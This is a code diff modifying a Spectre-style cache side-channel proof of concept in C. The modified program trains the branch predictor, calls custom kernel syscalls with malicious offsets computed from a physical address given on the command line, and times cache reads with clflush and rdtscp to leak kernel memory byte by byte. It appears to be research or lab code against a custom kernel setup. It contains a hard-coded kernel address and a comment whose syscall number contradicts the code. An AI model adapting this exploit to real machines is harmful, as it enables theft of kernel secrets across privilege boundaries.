@@ -16,6 +16,9 @@
 #define MY_MMAP_LEN (256)
 #define PAGE_SIZE 4096
 
+#define SYSMYCALL 329  //系统调用号为223
+#define SYSMYCALLA 330
+
 /********************************************************************
  Victim code.
  ********************************************************************/
@@ -23,15 +26,16 @@ unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
 uint8_t unused2[64];
-uint8_t array2[256 * 4096];
+uint8_t *array2;
 
-char *secret = "The Magic Words are Squeamish Ossifrage.";
+// char *secret = "The Magic Words are Squeamish Ossifrage.";
 
-uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
+// uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
-void victim_function(size_t x, size_t y) {
-    syscall(222, x, y);
-}
+// void victim_function(size_t x, size_t y) {
+//     // printf("x: %zu, y: %zu\n", x, y);
+//     syscall(SYSMYCALL, x, y);
+// }
 
 
 /********************************************************************
@@ -53,7 +57,7 @@ void readMemoryByte(size_t malicious_x, size_t malicious_y, uint8_t value[2], in
 
         /* Flush array2[256*(0..255)] from cache */
         for (i = 0; i < 256; i++)
-            _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
+            _mm_clflush(&array2[i * 4096]); /* intrinsic for clflush instruction */
 
         /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
         training_x = tries % array1_size;
@@ -68,13 +72,14 @@ void readMemoryByte(size_t malicious_x, size_t malicious_y, uint8_t value[2], in
             x = training_x ^ (x & (malicious_x ^ training_x));
 
             /* Call the victim! */
-            victim_function(x, y);
+            // victim_function(x, malicious_y);
+            syscall(SYSMYCALL, x, malicious_y);
         }
 
         /* Time reads. Order is lightly mixed up to prevent stride prediction */
         for (i = 0; i < 256; i++) {
             mix_i = ((i * 167) + 13) & 255;
-            addr = &array2[mix_i * 512];
+            addr = &array2[mix_i * 4096];
             time1 = __rdtscp(&junk);         /* READ TIMER */
             junk = *addr;                    /* MEMORY ACCESS TO TIME */
             time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
@@ -105,11 +110,8 @@ void readMemoryByte(size_t malicious_x, size_t malicious_y, uint8_t value[2], in
 int main(int argc, const char **argv) {
     int i, score[2], len = 40;
     uint8_t value[2];
-
     size_t kernel_array1, kernel_array2, secret_physical_address, secret_kernel_vir, prob_kernel_vir;
-
     size_t malicious_x, malicious_y;
-
     int fd;
     int junk = 0;
 
@@ -129,16 +131,19 @@ int main(int argc, const char **argv) {
         return -1;
     }
 
-    kernel_array1 = syscall(333, 1);
-    kernel_array2 = syscall(333, 2);
+    kernel_array1 = syscall(SYSMYCALLA, 1);
+    kernel_array2 = syscall(SYSMYCALLA, 2);
+    sscanf(argv[1], "%lx", (&secret_physical_address));
+    secret_kernel_vir = syscall(SYSMYCALLA, secret_physical_address);
 
-    for (i = 0; i < sizeof(array2); i++)
-        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
-    if (argc == 3) {
-        sscanf(argv[1], "%p", (void **)(&malicious_x));
-        malicious_x -= (size_t)array1; /* Convert input value into a pointer */
-        sscanf(argv[2], "%d", &len);
+    for (int i = 0; i < 256 * 4096; i ++) {
+        array2[i] = 'x';
     }
+
+    malicious_x = secret_kernel_vir - kernel_array1; /* Convert input value into a pointer */
+    malicious_y = 0xffff92f4829317e0 - kernel_array2;
+    sscanf(argv[2], "%d", &len);
+
 
     printf("Reading %d bytes:\n", len);
     while (--len >= 0) {
